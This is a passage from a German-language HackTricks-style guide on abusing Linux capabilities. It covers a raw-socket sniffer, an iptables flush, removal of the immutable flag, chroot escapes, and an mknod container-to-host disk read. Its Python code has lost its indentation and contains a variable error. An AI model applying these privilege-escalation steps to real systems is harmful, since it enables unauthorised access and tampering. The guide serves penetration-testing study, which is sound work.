Wenn die **Umgebung** diese Fähigkeit gewährt, kann **`tcpdump`** sie ebenfalls zum Mitschneiden des Datenverkehrs verwenden.<sup>[[14]](#references)</sup>

**Beispiel mit Binary 2**

Das folgende Beispiel ist **`python2`**-Code, der zum Abfangen des Datenverkehrs der Schnittstelle "**lo**" (**localhost**) nützlich sein kann. Der Code stammt aus dem Lab "_Die Grundlagen: CAP-NET_BIND + NET_RAW_" von [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com).<sup>[[1]](#references)</sup>
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP_NET_ADMIN + CAP_NET_RAW

[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) verleiht dem Inhaber die Möglichkeit, **Netzwerkkonfigurationen zu ändern**, einschließlich Firewall-Einstellungen, Routing-Tabellen, Socket-Berechtigungen und Netzwerkschnittstelleneinstellungen innerhalb der verfügbaren Netzwerk-Namespaces. Außerdem ermöglicht es, den **promiscuous mode** auf Netzwerkschnittstellen zu aktivieren, wodurch das Sniffing von Paketen über mehrere Namespaces hinweg möglich wird.<sup>[[14]](#references)</sup>

**Beispiel mit binary**

Angenommen, die **python binary** verfügt über diese Capabilities.
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP_LINUX_IMMUTABLE

**Diese Capability ermöglicht das Ändern von Inode-Flags wie immutable und append-only.** Sie gewährt nicht direkt umfassendere Privilege Escalation-Rechte.<sup>[[14]](#references)</sup>

**Beispiel mit Binary**

Wenn du feststellst, dass eine Datei immutable ist und Python über diese Capability verfügt, kannst du **das immutable-Attribut entfernen und die Datei beschreibbar machen:**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
# Python code to remove the immutable flag and allow modifications
import fcntl
import os
import struct

FS_IMMUTABLE_FL = 0x00000010
FS_IOC_GETFLAGS = 0x80086601
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
flags = struct.unpack('i', fcntl.ioctl(fd, FS_IOC_GETFLAGS, struct.pack('i', 0)))[0]
fcntl.ioctl(fd, FS_IOC_SETFLAGS, struct.pack('i', flags & ~FS_IMMUTABLE_FL))
os.close(fd)

with open('/path/to/file.sh', 'a') as f:
f.write('New content for the file\n')
```
Die Operationen `FS_IOC_GETFLAGS` und `FS_IOC_SETFLAGS` lesen und aktualisieren Inode-Flags; `FS_IMMUTABLE_FL` ist das Immutable-Flag, das durch dieses Beispiel gelöscht wird.<sup>[[27]](#references)</sup>

> [!TIP]
> Beachte, dass dieses Immutable-Attribut normalerweise mit folgenden Befehlen gesetzt und entfernt wird:
>
> ```bash
> sudo chattr +i file.txt
> sudo chattr -i file.txt
> ```

## CAP_SYS_CHROOT

[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) ermöglicht die Ausführung des Systemaufrufs `chroot(2)`, wodurch möglicherweise das Entkommen aus `chroot(2)`-Umgebungen über bekannte Schwachstellen möglich wird.<sup>[[11]](#references)[[14]](#references)</sup>

- [How to break out from various chroot solutions](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf).<sup>[[11]](#references)</sup>
- [chw00t: chroot escape tool](https://github.com/earthquake/chw00t/)

## CAP_SYS_BOOT

[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) ermöglicht die Ausführung des Systemaufrufs `reboot(2)` zum Neustarten des Systems, einschließlich Befehlen wie `LINUX_REBOOT_CMD_RESTART2`; außerdem ermöglicht es `kexec_load(2)` und ab Linux 3.17 `kexec_file_load(2)` zum Laden neuer beziehungsweise signierter Crash-Kernel.<sup>[[14]](#references)</sup>

## CAP_SYSLOG

[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) wurde in Linux 2.6.37 von der umfassenderen Fähigkeit **CAP_SYS_ADMIN** getrennt und gewährt ausdrücklich die Möglichkeit, den Aufruf `syslog(2)` zu verwenden. Diese Fähigkeit ermöglicht das Anzeigen von Kernel-Adressen über `/proc` und ähnliche Schnittstellen, wenn die Einstellung `kptr_restrict` auf 1 gesetzt ist, wodurch die Offenlegung von Kernel-Adressen gesteuert wird. Seit Linux 2.6.39 ist der Standardwert für `kptr_restrict` 0, wodurch Kernel-Adressen offengelegt werden. Viele Distributionen setzen diesen Wert aus Sicherheitsgründen jedoch auf 1 (Adressen nur für uid 0 ausblenden) oder 2 (Adressen immer ausblenden).<sup>[[14]](#references)</sup>

Zusätzlich ermöglicht **CAP_SYSLOG** den Zugriff auf die `dmesg`-Ausgabe, wenn `dmesg_restrict` auf 1 gesetzt ist. Trotz dieser Änderungen behält **CAP_SYS_ADMIN** aufgrund historischer Vorgaben die Möglichkeit, `syslog`-Operationen auszuführen.<sup>[[14]](#references)</sup>

## CAP_MKNOD

[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) erweitert die Funktionalität des Systemaufrufs `mknod` über das Erstellen regulärer Dateien, FIFOs (benannter Pipes) oder UNIX-Domain-Sockets hinaus. Sie ermöglicht ausdrücklich das Erstellen spezieller Dateien, darunter:<sup>[[14]](#references)</sup>

- **S_IFCHR**: Character-Special-Dateien, also Geräte wie Terminals.
- **S_IFBLK**: Block-Special-Dateien, also Geräte wie Festplatten.

Diese Fähigkeit ist für Prozesse nützlich, die Gerätedateien erstellen müssen, einschließlich Character- oder Block-Geräten.<sup>[[14]](#references)</sup>

Sie ist in der dokumentierten Standard-Menge von Docker-Fähigkeiten enthalten. Überprüfe die tatsächliche Laufzeitkonfiguration, statt anzunehmen, dass jede Bereitstellung dieselben Standardwerte verwendet ([Moby default capability list](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).<sup>[[19]](#references)</sup>

Diese Fähigkeit ermöglicht unter den folgenden Bedingungen Privilege Escalations (durch vollständiges Lesen der Festplatte) auf dem Host:<sup>[[7]](#references)</sup>

1. Initialen Zugriff auf den Host haben (Unprivileged).
2. Initialen Zugriff auf den Container haben (Privileged (EUID 0) und effektives `CAP_MKNOD`).
3. Host und Container müssen denselben User Namespace verwenden.

**Schritte zum Erstellen und Zugreifen auf ein Blockgerät in einem Container:**

1. **Auf dem Host als Standardbenutzer:**

- Ermittle deine aktuelle Benutzer-ID mit `id`, z. B. `uid=1000(standarduser)`.
- Identifiziere das Zielgerät, zum Beispiel `/dev/sdb`.

2. **Im Container als `root`:**
```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```
3. **Zurück auf dem Host:**
```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```
Dieser Ansatz ermöglicht es dem Standardbenutzer, über den Container auf Daten von `/dev/sdb` zuzugreifen und diese potenziell zu lesen, wenn Gerät, Namespaces und Berechtigungen wie beschrieben konfiguriert sind.<sup>[[7]](#references)</sup>

### CAP_SETPCAP

Auf aktuellen Linux-Kernels mit file capabilities ermöglicht **`CAP_SETPCAP`** einem Thread, Capabilities aus seiner Bounding Set zu seiner inheritable Set hinzuzufügen, Capabilities aus seiner Bounding Set zu entfernen und seine Securebits zu ändern. Es ermöglicht einem Prozess nicht, einem anderen Prozess beliebige Capabilities zu gewähren; dieses Verhalten gilt nur für Pre-2.6.25-Kernels ohne Unterstützung für file capabilities.<sup>[[14]](#references)</sup>

Der Systemaufruf `capset()` kann die eigenen effective, permitted und inheritable Sets eines Threads anpassen. Die neue permitted Set darf jedoch keine Capabilities außerhalb der bestehenden permitted Set enthalten, und Aktualisierungen der inheritable Set unterliegen weiterhin den Einschränkungen des Kernels.<sup>[[14]](#references)</sup>

## References

- [1] [AttackDefense (Pentester Academy) - Linux-Capabilities-Privilege-Escalation-Labs](https://attackdefense.pentesteracademy.com)
- [2] [Hacker's Grimoire - Linux-Privilege-Escalation](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
- [3] [Linux-Container-Grundlagen: Capabilities](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
- [4] [Linux Capabilities 101](https://linux-audit.com/linux-capabilities-101/)
- [5] [Linux Capabilities ausnutzen](https://www.linuxjournal.com/article/5737)
- [6] [Übermäßige Capabilities](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
- [7] [Zugriff auf Mount-Namespaces über /proc/pid/root missbrauchen](https://labs.reversec.com/posts/2020/06/abusing-access-to-mount-namespaces-through-procpidroot)
- [8] [Linux Capabilities: Warum sie existieren und wie sie funktionieren](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
- [9] [Capabilities unter Linux verstehen](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)
- [10] [PoC zum Umgehen von seccomp, wenn ptrace erlaubt ist](https://gist.github.com/thejh/8346f47e359adecd1d53)
- [11] [Aus verschiedenen chroot-Lösungen ausbrechen](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
- [12] [shocker.c - Originaler CAP_DAC_READ_SEARCH-Docker-Breakout-Exploit von Sebastian Krahmer](http://stealth.openwall.net/xSports/shocker.c)
- [13] [Analyse eines Docker-Breakout-Exploits](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)
- [14] [capabilities(7) - Linux-Handbuchseite](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [15] [proc_pid_status(5) - Linux-Handbuchseite](https://man7.org/linux/man-pages/man5/proc_pid_status.5.html)
- [16] [pam_cap(8) - Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/pam_cap.8.html)
- [17] [capability.conf(5) - Ubuntu-Handbuchseite](https://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)
- [18] [systemd.exec(5) - Linux-Handbuchseite](https://man7.org/linux/man-pages/man5/systemd.exec.5.html)
- [19] [Container ausführen - Docker-Dokumentation](https://docs.docker.com/engine/containers/run/)
- [20] [docker container run - Docker-Dokumentation](https://docs.docker.com/reference/cli/docker/container/run)
- [21] [cap_text_formats(7) - Linux-Handbuchseite](https://man7.org/linux/man-pages/man7/cap_text_formats.7.html)
- [22] [getpcaps(8) - Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/getpcaps.8.html)
- [23] [getcap(8) - Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [24] [amicontained](https://github.com/genuinetools/amicontained)
- [25] [setcap(8) - Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/setcap.8.html)
- [26] [capsh(1) - Linux-Handbuchseite](https://man7.org/linux/man-pages/man1/capsh.1.html)
- [27] [ioctl_iflags(2) - Linux-Handbuchseite](https://man7.org/linux/man-pages/man2/ioctl_iflags.2.html)
{{#include ../../banners/hacktricks-training.md}}
